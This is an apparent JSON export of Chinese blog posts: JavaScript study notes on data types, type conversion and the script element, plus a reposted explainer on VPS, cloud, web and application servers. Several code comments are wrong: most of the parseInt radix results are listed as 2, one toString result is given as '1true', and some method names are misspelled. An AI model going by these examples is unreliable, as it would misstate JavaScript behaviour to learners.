对于一个未声明的变量，只能进行一个操作，那就是使用typeof检测其数据类型（对未声明的变量调用delete在普通模式下虽然不报错但没有意义，同时严格模式还是会报错的）。同时需要注意的是，对未初始化的变量执行typeof会返回&quot;undefined&quot;值，与未声明的变量执行一样。即：12var msg;typeof msg === typeof age; // true 综上，显示初始化变量是一个好的选择，即当typeof操作符返回&quot;undefined&quot;的时候，就知道被检测变量没声明而不是没初始化。 Null类型Null类型也是只有一个值的数据类型，即null。从逻辑上来说，null值表示一个空对象指针，所以typeof检测null返回object是合理的。 若定义的变量准备在将来用于保存对象，那么最好将变量初始化为null而不是其他值，这样只要对比null值就知道是否已经保存了一个对象的引用：123if(car !== null)&#123; // ...&#125; 而undefined值派生自null，所以两者比较返回true（涉及到数据类型的隐式转换）,但用全等比较时则返回false，因为全等首先比较就是数据类型12null == undefined; // truenull === undefined; // false 虽然null和undefined的关系有些混乱，但记着他们的用途不用就行了。即无论如何，没有必要将一个变量的值显示设置为undefined，但对null却没有这个规则。换句话说，只要意在保存对象的变量还没有真正保存对象时，就应该让其保存null，这样不仅能体现null作为空对象指针的惯例，也有助于进一步区分null和undefined。 Boolean类型虽然Boolean类型只有两个字面量值：true和false，但其是用的最多的类型。注意：true不一定等于1，false也不一定等于0。同时他们是区分大小写的。 由于ES的隐式转换规则，所有类型的值都有与这两个Boolean值等价的值。也可以显示调用转换函数Boolean()将任意一个值转换为Boolean值：1Boolean('hello'); // true 转换规则如下（需要特别注意数据的隐式转换）： 数据类型 转换为true的值 转换为false的值 String 任何非空字符串 &quot;&quot;（空字符串） Number 任何非零数字值（包括无穷） 0和NaN Object 任何对象 null Undefined 不适用此规则 undefined Number类型ES中的Number类型使用IEEE754标准表示整数和浮点数（双精度数值），ECMA-262定义了不同的数值字面量格式。 十进制，默认的格式， 1var intNum = 55; // 整数 八进制，第一位必须是0（零），然后是八进制数字序列（0 ~ 7），若字面量值中的数字超出了范围，则忽略前导0，后面的数值按十进制解析： 123var octalNum1 = 070; // 八进制，解析为十进制 56var octalNum2 = 079; // 无效八进制，解析为十进制 79var octalNum3 = 08; // 无效八进制，解析为十进制 8 在严格模式下，八进制是无效的，会报错 十六进制，前两位必须是0x（零x），后跟任何十六进制数字（0 ~ 9，A ~ F / a ~ f），其中字母大小写皆可。12var hexNum1 = 0xA; // 十六进制，解析为十进制 10var hexNum2 = 0x1f; // 十六进制，解析为十进制 31 在进行算术运算时，所有以八进制或十六进制表示的数值最终都将被转换成十进制数值。 浮点数值浮点数即数值中必须包含一个小数点，并且至少有1未小数，小数点前的0可以省略，但不推荐。123var floatNum1 = 1.1;var floatNum2 = 0.1;var floatNum3 = .1; // 有效，不推荐 由于保存浮点数值需要的内存空间是保存整数值的两倍，因此ES会尽量将浮点数值转换为整数值，即当小数点后没有数字（1.）或本身就是一个整数时（1.0），那么就被转换为整数。 对于极大或极小的数值，可以用科学计数法表示。虽然浮点数值最高精度是17位小数，但在进行算术计算时精确度远不如整数，小小的舍入误差会导致无法比较特定的浮点数值：12345if(a + b == 0.3)&#123; // 0.15 + 0.15 没问题 // 0.1 + 0.2 会出错 // 所以不要比较某个特定的浮点数值&#125; 浮点数的舍入误差是由于采用IEEE754标准的问题，其他基于IEEE754计算浮点数的语言也会出现这种问题。 数值范围由于内存限制，ES所能表示的最小的数值在变量Number.MIN_VALUE中，最大值在变量Number.MAX_VALUE中，若某次计算的结果超出了js的数值范围，则这个数值将会自动转换成特殊的Infinity值，具体来说，若是负数则转换为-Infinity（负无穷） 若某次计算的结果为正/负无穷，则无法参加下一次的计算，因为Infinity不是一个可以进行计算的数值。要想确定一个数值是不是有穷的，可以使用isFinite()方法,当数值位于最小和最大的数值之间时返回true。12var result = Number.MAX_VALUE + Number.MAX_VALUE;console.log(isFinite(result)); // false NaNNaN，即非数值（Not a Number），是一个特殊的值，这个数组用于表示一个本来要返回数值的操作数未返回数值的情况（不会报错），比如任何数值除以0都会出错，其他语言一般会报错，代码停止执行，但是js不会，只会返回NaN，这样不会影响到其他代码的执行。 NaN本身有两个特点： 任何涉及NaN的计算操作都会返回NaN， NaN和任何数都不想等，包括它自己。 针对上述特点，ES定义了isNaN()函数来确定参数是否“不是数值”，它在接收到一个值后，会尝试将这个值转换为数值（比如字符串&quot;10&quot;或Boolean值true），若不能转换为数值则会导致这个函数返回true。12345isNaN(NaN); // trueisNaN(10); // false, 10是一个数值isNaN(\"10\"); // false， 能被转换为数值10isNaN(\"blue\"); // true， 不能转换为数值isNaN(true); // false，能被转换为数值1 特别注意：isNaN能被用于对象，当对一个对象调用isNaN函数时，首先会调用对象的valueOf()方法，然后确定该方法返回的值是否可以转换为数值，若不能，则再基于这个返回值再调用toString()方法，在测试toString()返回的值。这个流程也是ES的内置函数和操作符流程。 数值转换有3个函数可以把非数值转换为数值：Number(),parseInt()和parseFloat()，第一个函数，可以用于任何数据类型，其他两个函数专用于将字符串转换为数值，这3个函数对于同样的输入会返回不同的结果：Number()函数的转换规则如下： 若是Boolean值，true转换为1，false转换为0 若是数值值，则直接返回 若是null值，则返回0 若是undefined值，则返回NaN 若是字符串，则规则如下: 若字符串只包含数字（包括带正号和负号的情况），则将其转换为十进制数值（前导零会被忽略） 若字符串包含有效的浮点格式（如&quot;1.1&quot;），则转换为对应的浮点数值（同样忽略前导零） 若字符串包含有效的十六进制格式（如&quot;0xf&quot;），则转换为相同大小的十进制整数 若字符串是空，则转换为0 若字符串不满足上述规则，则转换为NaN 若是对象，则转换规则与isNaN相似，首先会调用对象的valueOf()方法，然后将valueOf()方法返回的值依据上述规则转换为数值，若结果为NaN，则再调用对象的toString()方法，然后再将toString()返回的值按照前面的规则转换为字符串值。 由于Number()函数在转换字符串时比较复杂而且不够合理，所以在处理整数的时候更常用的是parseInt函数。 parseInt在转换字符串时，主要看其是否符合数值模式，它会忽略字符串前面的空格，直至找到第一个非空字符。若第一个字符不是数字字符或负号，则返回NaN，也就是说，parseInt转换空字符串会返回NaN（而Number则返回0）。若第一个字符时数字字符，则继续解析第二个字符，直到解析完所有字符或遇到一个非数字字符。例如：&quot;1234ac&quot;会转换为1234，blue会被忽略，&quot;22.11&quot;会转为22，因为小数点不是有效的数字字符。 需要注意的是，parseInt能转换各种进制的整数格式，若以“0x”开头，则当做十六进制解析。若字符串的以“0”开头，理论上则会当做八进制解析，但ES3和ES5对八进制解析有区别，ES3认为是八进制，而ES5将不具有解析八进制的能力，即parseInt(&quot;070&quot;)会转换为0。 而为了消除上述的困惑，parseInt函数提供第二个参数，转换基数（即进制），默认为10进制, 同时参数一可以省略表示进制的前导符，但由于js的实现，不指定基数则由实现自行决定转换规则，所以无论如何要指定基数，即使是十进制。1234567parseInt('0xAF', 16); // 175parseInt('AF', 16); // 175parseInt('AF'); // NaNparseInt(\"10\", 2); // 2 二进制解析，转换为十进制得到 2parseInt(\"10\", 8); // 2 八进制解析，转换为十进制得到 8parseInt(\"10\", 10); // 2 十进制解析 10parseInt(\"10\", 16); // 2 十六进制解析，转换为十进制得到 16 与parseInt类似，parseFloat则将字符串解析为浮点数，依次解析每一个字符，直至第一个无效的浮点数字符，即字符串中的第一个小数点有效，而第二个小数点则无效，其后面的字符也将被忽略。如22.13.1将转换为22.13 parseFloat将始终忽略前导0，而十六进制的字符串则会解析为0，同时，若字符串解析的结果可转换为整数，则parseInt会返回整数：123456parseFloat(\"1234Float\"); // 1234 整数parseFloat(\"0xA\"); // 0parseFloat(\"22.5\"); // 22.5parseFloat(\"22.13.1\"); // 22.13parseFloat(\"0901.2\"); // 901.2parseFloat(\"1.1e3\"); // 1100 String类型String类型即字符串，由零个或多个16位Unicode字符组成的字符序列。字符串可以选择使用单引号或双引号表示。 字符字面量String数据类型包含一些特殊的字符字面量，即转义序列，用于表示非打印字符或其他用途的字符，例如 \\n 换行 \\t 制表 \\b 空格 \\r 回车 \\\\ 斜杠 \\xnn 以十六进制代码nn表示一个字符，n为0 ~ f，例如\\x41表示&quot;A&quot; \\unnnn 以十六进制代码nnnn表示一个Unicode字符，n为0 ~ f，例如\\u03a3表示希腊字符Σ还有很多其他转义序列，这些转义序列可以出现在字符串中任意位置，同时也作为一个字符来解析，即只占1个字符的大小，即若字符串中包含双字节字符，那么length属性可能不会精确返回字符串的字符数目。 字符串特点ES中的字符串是不可变的，即字符串一旦创建，值就不可变。要修改某个变量保持的字符串中的某个字符，必须销毁原来的字符串，然后再用另一个新字符串填空该变量。 转换为字符串将一个值转换为字符串有两种方式，第一种是每个值都会有的toString方法，这个方法唯一作用就是返回相应值的字符串表示。1234var age = 11;age.toString(); // 字符串 \"11\"var found = true;age.toString(); // 字符串 \"1true\" 数值、布尔值、对象和字符串（每个字符串的toString方法返回该字符串的一个副本）都有toString方法，但null和undefined没有该方法。 多数情况下，toString不用参数，但当调用一个数值的toString方法时，可以传递一个参数，表示基数，默认为10，这个基数只要是任意有效进制格式即可：123456var num = 10;num.toString(); // \"10\"num.toString(2); // \"1010\"num.toString(8); // \"12\"num.toString(10); // \"10\"num.toString(16); // \"a\" 第二种就是转型函数String()，该函数按照toSting的规则转换：但遇到null和undefined时分别返回字符串&quot;null&quot;和&quot;undefined&quot;。 还有一个简单的方法就是使用加号操作符，将它与空字符串相加，即可获得一个字符串值了。 Object类型ES中的对象其实就是一组数据和功能的集合，对象可以通过执行new操作符后跟要创建的对象类型的名称来创建，而创建Object类型的实例并为其添加属性或方法，就可以创建自定义对象，如下：1var o = new Object(); 与java语法类似，Object其实是一个构造函数，而在ES中，若不给构造函数传递参数，则可以省略后面的一对圆括号，即上面的实例代码与下面语句等价：1var o = new Object; // 有效，但不推荐省略圆括号 仅仅是创建Object实例没什么用处，关键是理解一个思想：在ES中，Object的构造函数是其实例的基础，即Object类型所具有的任何属性和方法也同样存在于更具体的对象中，而每个Object的实例对象都具有下列属性和方法： Constructor 属性，构造函数，保存着用于创建当前对象的函数，对于前面的例子，构造函数就是Object() hasOwnProperty(propertyName) 方法，用于检查给定属性在当前对象实例中（而不是实例的原型中）是否存在。其中，作为参数的属性名propertyName必须以字符串形式给出，即o.hasOwnProperty(&quot;name&quot;); isPropertyOf(object) 方法，用于检查传入的对象是否是另一个对象的原型 propertyIsEnumerable(propertyName) 方法，用于检查给定属性是否能够使用for-in语句来枚举，与hasOwnProperty方法一样，作为参数的属性名必须是字符串。 toLocalString() 方法，返回对象的字符串表示，该字符串与执行环境的地区有关 toString() 方法，返回对象的字符串表示 valueOf() 方法，返回对象的字符串、数值或布尔值表示，通常与toString方法的返回值相同。 ES中的Object是所有对象的继承，隐藏所有对象都具有这些基本的属性和方法，后续将深入学习。同时由于ECMA-262定义的对象行为不一定适用于所有js的其他对象，比如浏览器中的对象，BOM、DOM中的对象都属于宿主对象，因此由宿主实现的宿主对象可能不会继承Object。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"【转载/整理】关于某某服务器的术语的含义和理解","slug":"server-type","date":"2016-08-03T06:07:40.000Z","updated":"2016-08-03T06:07:40.000Z","comments":true,"path":"2016/08/03/server-type/","link":"","permalink":"https://github.com/xmoyKING/2016/08/03/server-type/","excerpt":"","text":"关于各种某某服务器的含义，比如VPS, 独立服务器，云服务器，Web服务器，应用服务器等 VPS, 独立服务器，云服务器的区别作者：任旭链接：https://www.zhihu.com/question/19656397/answer/20560678来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 如果将VPS比作一个水龙头，服务器的计算和存储资源则是一根水管，水管上有很多水龙头。你需要付出租用这个水龙头的费用，而它的水流量是有限的。如果你想获得更大的水流，那么你需要租用更多的龙头，同时，如果所有的龙头都在流水，那么每个龙头的水流量都会降低。而云计算下的主机，你所获得的是一个流量可大可小的龙头，服务器由一台变成一组，就像一个水管变成很多条水管组成的大水管。当你需要更大的水流时，可以直接控制你的龙头加大水流，同时即便所有的水管都在流水，也不会影响你的水流。更有甚者，你需要付出的费用，不再是租用水管产生的，而是为你所需要的水流量。至于自己架设或者租用整个服务器，目前来看经济型就差很多了，因为你要连水龙头和水管都买下来，不够用的时候还要再买。我们都知道服务器资源通常使用率也就20%，除非业务非常稳定，不会明显增长，或者特别不差钱，可以考虑自建。虽然我们知道了云主机和VPS的区别，但如何挑选云主机成为了一个难题，可以说这个市场鱼龙混杂，甚至卖到的云主机，其实就是一台VPS。于是我们要关注两个要点，第一、这个大水管的质量如何，即所依托的数据中心质量如何。第二、这个大水管和各个水龙头的衔接是否有效，水龙头的流水量和稳定程度能否得到保证。衡量数据中心的质量，说法很多，其实最简单的方法是看机房的客户，如果一个数据中心的主要客户是银行，你说差的了么？如果一个数据中心的主要客户是私服，你说好的了么？至于大水管的衔接问题，主要该考虑虚拟化技术（网络也是关键，但云计算背景下网络已经变得次要了），网传很多云主机的应用跑不了，或者容易出问题，这些主要源于虚拟化技术。这块技术可以说还在发展期，相对比较成熟和领先的，应该说VMware首屈一指，国内的阿里云、盛大云等产品也在高速追赶，褒贬不一，可以自己看看网评。综合来看，想要一个更好的云计算IAAS，还是要衡量你对这个云主机的要求。一般简单的建站需求，阿里云、盛大云都是不错的选择，甚至评价比较好的VPS都能应对要求不高的建站，重点看预算，能接受的话还是推荐云主机，注意别被VPS忽悠了就好。如果是需要企业级应用，公司里面跑ERP，CRM，甚至SAAS厂商，那就必须严格考量上面说的水管质量和衔接问题了，国内银行业数据中心供应商，除了自建外肯定是GDS最有名了，至于VMware的公有云IAAS，在亚太地区只有软银电信和新加坡电信有授权，目前GDS开始和软银合作这块业务，推出了基于VMware的云数据中心业务，应该属于国内中高端云主机（或者该叫云数据中心）的首选解决方案了。另外低端的云主机万国也有，还提供2周免费试用…与其四处浏览，何不申请试试？ web服务器和应用服务器有什么区别？参考：https://zhidao.baidu.com/question/43745729.html?qbl=relate_question_3&amp;word=%D4%C6%D3%A6%D3%C3%BA%CD%C6%D5%CD%A8%CD%F8%D5%BE web服务器(web server)web服务器可以解析(handles)http协议。当web服务器接收到一个http请求(request)，会返回一个http响应 (response)，例如送回一个html页面。为了处理一个请求(request)，web服务器可以响应(response)一个静态页面或图片，进行页面跳转(redirect)，或者把动态响应(dynamic response)的产生委托(delegate)给一些其它的程序例如cgi脚本，jsp(javaserver pages)脚本，servlets，asp(active server pages)脚本，服务器端(server-side)javascript，或者一些其它的服务器端(server-side)技术。无论它们(译者注:脚本)的目的如何，这些服务器端(server-side)的程序通常产生一个html的响应(response)来让浏览器可以浏览。要知道，web服务器的代理模型(delegation model)非常简单。当一个请求(request)被送到web服务器里来时，它只单纯的把请求(request)传递给可以很好的处理请求 (request)的程序(译者注:服务器端脚本)。web服务器仅仅提供一个可以执行服务器端(server-side)程序和返回(程序所产生的)响应(response)的环境，而不会超出职能范围。服务器端(server-side)程序通常具有事务处理(transaction processing)，数据库连接(database connectivity)和消息(messaging)等功能。虽然web服务器不支持事务处理或数据库连接池，但它可以配置(employ)各种策略(strategies)来实现容错性(fault tolerance)和可扩展性(scalability)，例如负载平衡(load balancing)，缓冲(caching)。集群特征(clustering—features)经常被误认为仅仅是应用程序服务器专有的特征。 应用程序服务器(the application server)根据我们的定义，作为应用程序服务器，它通过各种协议，可以包括http，把商业逻辑暴露给(expose)客户端应用程序。web服务器主要是处理向浏览器发送html以供浏览，而应用程序服务器提供访问商业逻辑的途径以供客户端应用程序使用。应用程序使用此商业逻辑就象你调用对象的一个方法 (或过程语言中的一个函数)一样。应用程序服务器的客户端(包含有图形用户界面(gui)的)可能会运行在一台pc、一个web服务器或者甚至是其它的应用程序服务器上。在应用程序服务器与其客户端之间来回穿梭(traveling)的信息不仅仅局限于简单的显示标记。相反，这种信息就是程序逻辑(program logic)。正是由于这种逻辑取得了(takes)数据和方法调用(calls)的形式而不是静态html，所以客户端才可以随心所欲的使用这种被暴露的商业逻辑。在大多数情形下，应用程序服务器是通过组件(component)的应用程序接口(api)把商业逻辑暴露(expose)(给客户端应用程序)的，例如基于j2ee(java 2 platform, enterprise edition)应用程序服务器的ejb(enterprise javabean)组件模型。此外，应用程序服务器可以管理自己的资源，例如看大门的工作(gate-keeping duties)包括安全(security)，事务处理(transaction processing)，资源池(resource pooling)，和消息(messaging)。就象web服务器一样，应用程序服务器配置了多种可扩展(scalability)和容错(fault tolerance)技术。 例子例如，设想一个在线商店(网站)提供实时定价(real-time pricing)和有效性(availability)信息。这个站点(site)很可能会提供一个表单(form)让你来选择产品。当你提交查询 (query)后，网站会进行查找(lookup)并把结果内嵌在html页面中返回。网站可以有很多种方式来实现这种功能。我要介绍一个不使用应用程序服务器的情景和一个使用应用程序服务器的情景。观察一下这两中情景的不同会有助于你了解应用程序服务器的功能。 情景1:不带应用程序服务器的web服务器在此种情景下，一个web服务器独立提供在线商店的功能。web服务器获得你的请求(request)，然后发送给服务器端(server- side)可以处理请求(request)的程序。此程序从数据库或文本文件(flat file，译者注:flat file是指没有特殊格式的非二进制的文件，如properties和xml文件等)中查找定价信息。一旦找到，服务器端(server-side)程序把结果信息表示成(formulate)html形式，最后web服务器把会它发送到你的web浏览器。简而言之，web服务器只是简单的通过响应(response)html页面来处理http请求(request)。 情景2:带应用程序服务器的web服务器情景2和情景1相同的是web服务器还是把响应(response)的产生委托(delegates)给脚本(译者注:服务器端(server -side)程序)。然而，你可以把查找定价的商业逻辑(business logic)放到应用程序服务器上。由于这种变化，此脚本只是简单的调用应用程序服务器的查找服务(lookup service)，而不是已经知道如何查找数据然后表示为(formulate)一个响应(response)。这时当该脚本程序产生html响应(response)时就可以使用该服务的返回结果了。在此情景中，应用程序服务器提供(serves)了用于查询产品的定价信息的商业逻辑。(服务器的)这种功能(functionality)没有指出有关显示和客户端如何使用此信息的细节，相反客户端和应用程序服务器只是来回传送数据。当有客户端调用应用程序服务器的查找服务(lookup service)时，此服务只是简单的查找并返回结果给客户端。通过从响应产生(response-generating)html的代码中分离出来，在应用程序之中该定价(查找)逻辑的可重用性更强了。其他的客户端，例如收款机，也可以调用同样的服务(service)来作为一个店员给客户结帐。相反，在情景1中的定价查找服务是不可重用的因为信息内嵌在 html页中了。总而言之，在情景2的模型中，在web服务器通过回应html页面来处理http请求(request)，而应用程序服务器则是通过处理定价和有效性(availability)请求(request)来提供应用程序逻辑的。 警告(caveats)现在，xml web services已经使应用程序服务器和web服务器的界线混淆了。通过传送一个xml有效载荷(payload)给服务器，web服务器现在可以处理数据和响应(response)的能力与以前的应用程序服务器同样多了。另外，现在大多数应用程序服务器也包含了web服务器，这就意味着可以把web服务器当作是应用程序服务器的一个子集(subset)。虽然应用程序服务器包含了web服务器的功能，但是开发者很少把应用程序服务器部署(deploy)成这种功能(capacity)(译者注:这种功能是指既有应用程序服务器的功能又有web服务器的功能)。相反，如果需要，他们通常会把web服务器独立配置，和应用程序服务器一前一后。这种功能的分离有助于提高性能(简单的web请求(request)就不会影响应用程序服务器了)，分开配置(专门的web服务器，集群(clustering)等等)，而且给最佳产品的选取留有余地。","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"it","slug":"it","permalink":"https://github.com/xmoyKING/tags/it/"},{"name":"server-term","slug":"server-term","permalink":"https://github.com/xmoyKING/tags/server-term/"}]},{"title":"JavaScript高级程序设计-2-HTML中使用JS","slug":"js-pro2","date":"2016-08-02T00:57:39.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/02/js-pro2/","link":"","permalink":"https://github.com/xmoyKING/2016/08/02/js-pro2/","excerpt":"","text":"介绍如何在HTML中使用js，在页面中嵌入js的各种方法，以及js内容类型（content-type）及与&lt;script&gt;元素的关系。 script元素向HTML页面插入js的主要方法就是使用&lt;script&gt;元素，这个元素定义了6个属性： async 可选，表示立即下载脚本，但不妨碍其他操作（即，下载但不执行），只对外部脚本有效。 charset 可选，表示src属性指定的脚本文件的字符集，大多数浏览器忽略此属性 defer 可选，表示脚本可以延迟到文档完全被解析和显示之后再执行，只对外部脚本有效，IE7以前对嵌入脚本也支持这个属性 language 废弃，表示编写代码所使用的脚本语言（如JavaScript，VBScript） src 可选，表示外部文件地址，若同时包含嵌入代码则嵌入代码会被忽略。 type 可选，可看作是language的替代属性，但表示编写代码时的脚本语言的内容类型（content-type或称为MIME类型），一般使用text/javascript（也是默认值），但实际上服务器在传输js文件时使用的MIME类型是application/x-javascript（若显示设置为此值则也许会导致脚本文件被忽略），其实在非IE下还可以设置为其他值，如application/javascript和application/ecmascript，但为了兼容和约定，目前type依然是text/javascript。 浏览器对script元素内的js代码（无论是嵌入的还是外部的）都是从上至下依次解释，遇到函数定义时，会将该定义保存在当前的浏览器环境中，在解释器对script元素内部的所有代码求值完毕之前，页面中的其余内容不会被浏览器加载或显示的，即阻塞后续文件的执行和加载。 按照惯例、外部文件都是带有.js后缀扩展名的，但其实这个扩展名不是必须的，因为浏览器不会检查包含js的文件的扩展名。这样的话，就可以用其他语言动态生成js代码了，只要确保服务器返回正确的MIME类型即可，与现在的JSONP请求有点类似。 只要不存在defer和async属性，浏览器会按照script元素在页面中出现的先后顺序对它们依次解析。 使用外部文件有如下优点： 可维护性: 遍及不同HTML页面的js会造成维护问题，同时在不触及HTML的情况下能集中精力编辑js代码 可缓存：浏览器可缓存外部js文件 适应未来：外部文件包含的js代码无需关注文档类型是XHTML还是HTML 标签位置按理来说script元素的位置实在head中，包括css，将所有外部文件都放在相同的地方，但这样就意味着必须等到所有的js代码都被下载、解析、执行完成后才开始呈现页面内容（浏览器遇到body标签才开始呈现内容），若一个页面script元素非常多时，则会导致浏览器出现明显的延迟，即空白。 为了避免这个问题，现在一般是把js放在最靠近body结束标签的地方(&lt;/body&gt;之前，其他元素之后)，这样在解析包含js代码之前，页面的内容是完全呈现的，会让用户觉得打开页面的速度变快了。 延迟脚本defer属性的用途是表明脚本在执行时不会影响页面的构造，即脚本会被延迟到整个页面都解析完毕后在运行，因此，脚本将延迟到浏览器遇到&lt;/html&gt;再执行。 理论上，脚本会按照它们出现的先后顺序执行，同时所有的脚本都会在DOMContentLoaded事件前触发。但实际情况是，延迟脚本不一定按照顺序执行，也不一定是在DOMContentLoaded事件前触发，因此最佳实践是只包含一个defer脚本且放置在页面底部。 异步脚本HMTL5定义了async属性，这个属性与defer属性类似，都用于改变处理脚本的时间，async只用于外部脚本，浏览器会立即下载该脚本，但与defer不同的是，async不保证按照出现的先后顺序执行。 async属性的目的是不让页面等待两个脚本下载和执行，从而异步加载页面的其他内容，所以async脚本之间不能有依赖关系，而且最好不要在加载期间修改DOM。 异步脚本一定会在页面的load事件前执行，但不确定是在DOMContentLoaded之前还是之后。 由于HTML5规范的推广，不建议再学习XHTML中使用js 文档模式IE5.5引入了文档模式的概念，通过使用文档类型（doctype）切换实现文档模式的切换，最初有两种文档模式：混杂模式（quirks mode）和标准模式（standards mode），混杂模式会让IE的行为与（包含非标准特性的）IE5相同，而标准模式会让IE的行为更接近标准行为。主要影响CSS内容的呈现、某些情况也影响js的解释执行。 在IE引入文档模式的概念后，其他浏览器也开始效仿。之后，IE又推出了准标准模式（almost standards mode），这种模式下浏览器很多都是符合标准的，但也有例外，不标准主要体现在图片间隙等。 若在文档开始处没有发现文档类型声明，则所有浏览器都默认开启混杂模式。但不推荐采用混杂模式，因为不同浏览器在这种模式下的行为差异较大。 对于标准模式，通过使用下面的文档类型来开启（推荐HTML5模式）:12345678&lt;!-- HTML 4.01 严格型 --&gt;&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;&lt;!-- XHTML 1.0 严格型 --&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;&lt;!-- 推荐使用：HTML 5 --&gt;&lt;!DOCTYPE html&gt; 准标准模式和标准模式非常接近，差异几乎忽略不计，同时在检测文档模式时也不会有什么不同，准标准模式则可以通过过渡型（transitional）或框架集型（frameset）文档类型来触发，例如：1234567&lt;!-- HTML 4.01 过渡型 --&gt;&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;!-- HTML 4.01 框架集型 --&gt;&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Frameset//EN\" \"http://www.w3.org/TR/html4/frameset.dtd\"&gt; noscript元素当浏览器不支持js时显示替代的内容，该元素可以放在任何body中的元素中，除了script元素，在下列情况下会被显示： 浏览器只支持js 浏览器支持js，但被禁用12345678&lt;html&gt; &lt;head&gt;&lt;title&gt;No JS&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;p&gt;本页面需要开启js&lt;/p&gt; &lt;/noscript&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-1-js简介","slug":"js-pro1","date":"2016-08-01T09:35:38.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2016/08/01/js-pro1/","link":"","permalink":"https://github.com/xmoyKING/2016/08/01/js-pro1/","excerpt":"","text":"学习《JavaScript高级程序设计》过程中记录的笔记，本节涉及JavaScript和ECMAScript的关系，DOM、BOM等概念的简单介绍。 JavaScript实现虽然JavaScript和ECMAScript通常视为一个概念，但JavaScript含义比ECMA-262中规定的要多，一个完整的JavaScript实现由三个部分组成： 核心（ECMAScript） 文档对象模型（DOM） 浏览器对象模型（BOM） ECMAScript由ECMA-262定义的ECMAScript和Web浏览器没有依赖关系。实际上，ECMAScript并不包括输入和输出，定义的只有语言的基础，在此基础上的各种实现可以构建更完善的脚本语言。 常见的Web浏览器只是ECMAScript实现的宿主环境之一，宿主环境不仅提供基本的实现，同时也会提供语言的扩展，以便语言与环境之间的对接交互，而这些扩展——如DOM则利用ECMAScript的核心类型和语法提供更多更具体的功能，一遍实现针对环境的操作，其他宿主环境包括Node（服务端的JS平台）和Adebe Flash。 ECMA-262规定了如下的部分： 语法 类型 语句 关键字 保留字 操作符 对象 ECMAScript就是对实现该标准规定的各个方面内容的语言的描述，JavaScript是ECMAScript的实现之一, Adobe ActionScript同样是ECMAScript的实现之一。以后简称ECMAScript为ES。 ES版本 ES1： 本质与JavaScript 1.1相同，但删除了针对浏览器的代码并进行改动，支持Unicode从而支持多语言开发，对象编程平台无关（如Date对象） ES2：较ES1没什么修改 ES3: 标志着ES成为一门真正的编程语言，修改涉及字符串处理、错误定义、数值输出，添加正则表达式、控制语句、try-catch异常处理，添加国际化 ES4：对ES3的全面修订，基本算是一门新的语言，包括强类型、新语句和数据结构、类、经典继承、数据交互等，但由于跨越太大，最后放弃。 ES5：实际是对ES3的修改（ES3.1），澄清歧义、添加JSON对象、继承的方法、高级属性定义、以及严格模式，对ES引擎解释和执行代码进行补充说明 ES兼容ES兼容就是指：ES的实现必须做到如下： 支持ECMA-262描述的所有“类型，值，对象，属性，函数以及程序句法和语法” 支持Unicode字符标准兼容的实现可以做如下扩展： 添加ECMA-262没有描述的“类型、值、对象、属性和函数” 支持ECMA-262没有定义的“程序和正则表达式语法”，即可以修改和扩展内置的正则表达式语法 浏览器对ES的支持原文中主要给出的是ES5以下的版本支持情况，但对现在的情况而言，IE9即其他现代浏览器都至少支持ES5，但由于IE系列对CSS3的支持不足，所以开发的话，若需要兼容IE则主要是指CSS3的兼容。 文档对象模型（DOM）文档对象模型（DOM，Document Object Model）是针对XML但进过扩展用于HTML的API。DOM把整个页面映射为一个多层节点结构。HTML或XML页面中每个组成部分都是某种类型的节点，这些节点又包含不同类型的数据。 如下例：12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;Sample Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Hello World&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 上述代码可转化为如下的分层节点图表示： 通过DOM创建的表示文档的树形图，开发者获取了控制页面内容和结构的主动权，借助DOM提供的API，开发者可轻松的删除、添加、替换或修改任何节点。 由于IE和Netscape支持不同的DHTML，所以需要一个统一的标准，即W3C定义的DOM。注：其实DOM并不是针对JS的，很多其他语言也实现了DOM，但由于浏览器中基于ES实现的DOM已经成为JS的一个重要组成部分，所以一般指浏览器环境下的DOM。 W3C定义的DOM是有级别的，DOM1级由两个模块组成，DOM Core（核心）和DOM HTML， 其中核心规定的是如何映射基于XML的文档结构，以便简化对文档中任意部分的访问和操作。DOM HTML模块则在核心基础上加以扩展，添加了对HTML的对象和方法。 如果说DOM1的目标是映射文档结构，那么DOM2则宽泛很多了，DOM2在原来的基本上扩展了鼠标和用户界面事件、范围、遍历（迭代DOM文档的方法）等细分模块，而且通过对象接口增加了对CSS的支持，DOM1中的核心模块被扩展为支持XML命名空间。 DOM2引入如下新模块、类型、接口： DOM视图（DOM View）: 定义了跟踪不同文档（如应用CSS之前和之后的文档）视图的接口 DOM事件（DOM Events）: 定义了事件和事件处理的接口 DOM样式（DOM Style）：定义了基于CSS为元素应用样式的接口 DOM遍历和范围（DOM Traversal and Range）：定义了遍历和操作文档树的接口 DOM3则进一步扩展了DOM：引入以统一方式加载和保存文档的方法（定义在DOM加载和保存（DOM Load and Save）模块中），新增验证文档的方法（定义在DOM验证（DOM Validation）模块中），核心模块开始支持XML 1.0规范，涉及XML Infoset，XPath和XML Base。 